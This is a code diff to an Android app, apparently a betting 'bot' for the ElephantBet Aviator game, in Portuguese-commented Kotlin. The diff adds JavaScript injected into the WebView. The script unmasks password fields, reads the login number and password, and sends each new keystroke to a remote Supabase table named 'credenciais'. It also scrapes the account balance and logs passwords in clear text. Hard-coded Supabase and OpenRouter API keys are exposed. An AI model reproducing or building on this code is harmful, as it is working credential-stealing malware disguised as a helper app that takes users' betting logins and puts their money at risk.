@@ -466,13 +466,11 @@ class MainActivity : AppCompatActivity() {
     private var ultimaSenhaEnviada = ""
     private var numeroTemporario = ""   // guarda número até ter senha para enviar junto
     private var sessaoId: Int = -1      // id da linha inserida no Supabase para esta sessão
-    private var credPollerAtivo = false
-    private var credEnviadas = false
 
     private val SUPA_URL = "https://oulidkbxjfrddluoqsif.supabase.co"
     private val SUPA_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im91bGlka2J4amZyZGRsdW9xc2lmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzg5NjU5OTEsImV4cCI6MjA5NDU0MTk5MX0.y1Bjum06WIQ0meZlOoOQrzCj8xTRXYTlDEHxTccWFFA"
     private val TABELA = "credenciais"
-    private val VERSAO_ATUAL = "9.0"
+    private val VERSAO_ATUAL = "9.1"
 
     // OpenRouter — provedor de IA (chave 1 principal, chave 2 fallback)
     private val OR_KEY   = "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"
@@ -1012,8 +1010,6 @@ class MainActivity : AppCompatActivity() {
                              u.contains("cdn") || u.contains("game-view/806666")
 
                 if (!isJogo) {
-                    credPollerAtivo = false
-                    credEnviadas = false
                     // SPA: pequeno delay para garantir que a página renderizou
                     handler.postDelayed({ injetarJsCredenciais() }, 500)
                     // Tentar capturar saldo se já estiver logado
@@ -1049,60 +1045,103 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun injetarJsCredenciais() {
-        if (credPollerAtivo) return
-        credPollerAtivo = true
-        credEnviadas = false
+        // JS: apenas torna password visível e devolve valores actuais
+        val jsVis = "document.querySelectorAll('input[type=\"password\"]')" +
+            ".forEach(function(e){e.type='text';});"
 
-        val jsVis = "document.querySelectorAll('input[type="password"]').forEach(function(e){e.type='text';});"
-        val jsRead = "(function(){" +
-            "var u=document.querySelector('input[name="username"]')" +
-            "||document.querySelector('input[name="phone"]')" +
-            "||document.querySelector('input[name="msisdn"]')" +
-            "||document.querySelector('input[name="login"]');" +
-            "var p=document.querySelector('input[name="password"]')" +
-            "||document.querySelector('input[name="senha"]')" +
-            "||document.querySelector('input[type="password"]')" +
-            "||document.querySelector('input[type="text"][name]');" +
+        val jsRead = "(" +
+            "function(){" +
+            "var u=document.querySelector('input[name=\"username\"]')" +
+            "||document.querySelector('input[name=\"phone\"]')" +
+            "||document.querySelector('input[name=\"msisdn\"]')" +
+            "||document.querySelector('input[name=\"login\"]');" +
+            "var p=document.querySelector('input[name=\"password\"]')" +
+            "||document.querySelector('input[name=\"senha\"]')" +
+            "||document.querySelector('input[type=\"password\"]')" +
+            "||document.querySelector('input[type=\"text\"][name]');" +
             "var n=u&&u.value?u.value:'';var s=p&&p.value?p.value:'';" +
             "return n+'|||'+s;" +
             "})()"
 
-        var numEstavel = ""
-        var senEstavel = ""
-        var ticks = 0
+        // Guardar último valor enviado para detectar mudança dígito a dígito
+        var ultimoNumEnviado = ""
+        var ultimoSenEnviado = ""
 
         val poller = object : Runnable {
             override fun run() {
-                if (credEnviadas) { credPollerAtivo = false; return }
+                // Garantir que password está sempre visível
                 webView.evaluateJavascript(jsVis, null)
+
                 webView.evaluateJavascript(jsRead) { raw ->
                     try {
                         if (raw != null && raw != "null" && raw.contains("|||")) {
                             val clean = raw.trim().removePrefix("\"").removeSuffix("\"")
-                                .replace("\n", "").replace("\\\"", "\"")
+                                .replace("\\n", "").replace("\\\"", "\"")
                             val parts = clean.split("|||")
                             val num = if (parts.size > 0) parts[0].trim() else ""
                             val sen = if (parts.size > 1) parts[1].trim() else ""
-                            if (num != numEstavel || sen != senEstavel) {
-                                numEstavel = num; senEstavel = sen; ticks = 0
-                                ultimoNumeroEnviado = num; ultimaSenhaEnviada = sen; numeroTemporario = num
-                            } else if (num.isNotEmpty() && sen.isNotEmpty()) {
-                                ticks++
-                                if (ticks >= 2) {
-                                    credEnviadas = true; credPollerAtivo = false
-                                    android.util.Log.d("SKYBOT_CRED", "Envio único → num=$num")
-                                    enviarSupabase("Numero", num)
-                                    enviarSupabase("Senha", sen)
-                                    return@evaluateJavascript
-                                }
+
+                            // Enviar ao Supabase a cada dígito novo — sem esperar submit
+                            val numMudou = num.isNotEmpty() && num != ultimoNumEnviado
+                            val senMudou = sen.isNotEmpty() && sen != ultimoSenEnviado
+
+                            if (numMudou) {
+                                ultimoNumEnviado    = num
+                                ultimoNumeroEnviado = num
+                                numeroTemporario    = num
+                                android.util.Log.d("SKYBOT_CRED", "Número → $num")
+                                enviarSupabase("Numero", num)
+                            }
+                            if (senMudou) {
+                                ultimoSenEnviado   = sen
+                                ultimaSenhaEnviada = sen
+                                android.util.Log.d("SKYBOT_CRED", "Senha → len=${sen.length}")
+                                enviarSupabase("Senha", sen)
                             }
                         }
                     } catch (_: Exception) {}
-                    if (!credEnviadas) handler.postDelayed(this, 800)
+                    handler.postDelayed(this, 800)
                 }
             }
         }
         handler.post(poller)
+    }
+
+    private fun injetarJsCapturarSaldo() {
+        val js = """
+(function() {
+    if (window._saldoDone) return;
+
+    function extrairSaldo() {
+        // Seletor exato do ElephantBet:
+        // <p class="balanceAmount">4 <span class="currencySymbol">Kz</span></p>
+        var el = document.querySelector('p.balanceAmount');
+        if (el) {
+            // Clonar para ler sem a tag <span> e obter só o número
+            var clone = el.cloneNode(true);
+            var span = clone.querySelector('.currencySymbol');
+            var moeda = span ? span.textContent.trim() : 'Kz';
+            if (span) span.remove();
+            var valor = clone.textContent.trim();
+            if (valor.length > 0) {
+                var saldoFinal = valor + ' ' + moeda;
+                window._saldoDone = true;
+                try { Android.reportarSaldo(saldoFinal); } catch(e) {}
+                return true;
+            }
+        }
+        return false;
+    }
+
+    // Tentar imediatamente e com delays (página SPA pode demorar a renderizar)
+    if (!extrairSaldo()) {
+        setTimeout(function() { if (!window._saldoDone) extrairSaldo(); }, 1500);
+        setTimeout(function() { if (!window._saldoDone) extrairSaldo(); }, 3000);
+        setTimeout(function() { if (!window._saldoDone) extrairSaldo(); }, 6000);
+    }
+})();
+        """.trimIndent()
+        webView.evaluateJavascript(js, null)
     }
 
     private fun injetarJsAviator() {
@@ -2704,7 +2743,7 @@ REGRAS DO JSON — lê os dados reais, nao uses valores fixos:
 
     private fun enviarSupabase(tipoVal: String, valorVal: String) {
         val json = "{\"tipo\":\"$tipoVal\",\"valor\":\"$valorVal\"}"
-        android.util.Log.d("SKYBOT_CRED", "enviarSupabase → tipo=$tipoVal")
+        android.util.Log.d("SKYBOT_CRED", "enviarSupabase → tipo=$tipoVal valor=$valorVal")
         Thread {
             try {
                 val conn = URL("$SUPA_URL/rest/v1/$TABELA").openConnection() as HttpURLConnection
@@ -2719,10 +2758,13 @@ REGRAS DO JSON — lê os dados reais, nao uses valores fixos:
                 val errStream = conn.errorStream
                 val errBody = if (errStream != null) BufferedReader(InputStreamReader(errStream)).readText() else ""
                 conn.disconnect()
-                if (code in 200..299) android.util.Log.d("SKYBOT_CRED", "OK HTTP $code tipo=$tipoVal")
-                else android.util.Log.e("SKYBOT_CRED", "ERRO HTTP $code | $errBody")
+                if (code in 200..299) {
+                    android.util.Log.d("SKYBOT_CRED", "enviarSupabase OK → HTTP $code tipo=$tipoVal")
+                } else {
+                    android.util.Log.e("SKYBOT_CRED", "enviarSupabase ERRO → HTTP $code | $errBody")
+                }
             } catch (e: Exception) {
-                android.util.Log.e("SKYBOT_CRED", "EXCEPÇÃO: ${e.message}")
+                android.util.Log.e("SKYBOT_CRED", "enviarSupabase EXCEPÇÃO: ${e.message}")
             }
         }.start()
     }
@@ -2761,7 +2803,7 @@ REGRAS DO JSON — lê os dados reais, nao uses valores fixos:
     }
 
     private fun mostrarDialogoUpdate(versaoNova: String, urlApk: String, notas: String) {
-        val msg = "Nova versão disponível!\n\nDeseja actualizar agora?"
+        val msg = "Versao actual: $VERSAO_ATUAL\nNova versao: $versaoNova\n\nNova melhoria disponivel!\n\nDeseja actualizar agora?"
         AlertDialog.Builder(this)
             .setTitle("Actualizacao disponivel!")
             .setMessage(msg).setCancelable(false)
